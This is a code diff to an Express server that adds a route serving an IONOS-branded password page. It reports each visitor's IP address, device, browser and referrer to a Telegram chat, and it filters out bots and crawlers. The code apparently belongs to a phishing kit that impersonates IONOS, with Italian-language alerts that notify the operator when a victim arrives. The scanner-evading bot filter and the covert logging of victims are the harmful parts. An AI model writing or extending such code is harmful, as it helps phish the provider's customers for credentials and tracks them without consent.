@@ -179,6 +179,36 @@ app.get("/ionos.html", async (req, res) => {
   res.sendFile(path.join(__dirname, "public", "ionos.html"));
 });
 
+app.get("/ionos-password.html", async (req, res) => {
+  if (process.env.TELEGRAM_NOTIFY === "true") {
+    const ip = getClientIp(req);
+    const ua = req.headers["user-agent"] || "";
+    const isBot = /bot|crawl|slurp|spider|uptime|monitor|ping/i.test(ua);
+    const lastSeen = recentVisitors.get(ip + "-ionos-pw");
+    const now = Date.now();
+    const onCooldown = lastSeen && now - lastSeen < VISITOR_COOLDOWN_MS;
+    if (!isBot && !onCooldown) {
+      recentVisitors.set(ip + "-ionos-pw", now);
+      const when = new Date().toUTCString();
+      const referrer = req.headers["referer"] || "Direct";
+      const device = parseDevice(ua);
+      const browser = parseBrowser(ua);
+      await sendTelegram(
+        [
+          "<b>👁️ Visitatore — IONOS Passwort</b>",
+          "",
+          `<b>IP:</b> ${escapeHtml(ip)}`,
+          `<b>Dispositivo:</b> ${device}`,
+          `<b>Browser:</b> ${browser}`,
+          `<b>Provenienza:</b> ${escapeHtml(referrer)}`,
+          `<b>Ora (UTC):</b> ${when}`,
+        ].join("\n")
+      );
+    }
+  }
+  res.sendFile(path.join(__dirname, "public", "ionos-password.html"));
+});
+
 app.use(express.static(path.join(__dirname, "public")));
 
 app.get("/health", (_req, res) => res.json({ ok: true }));
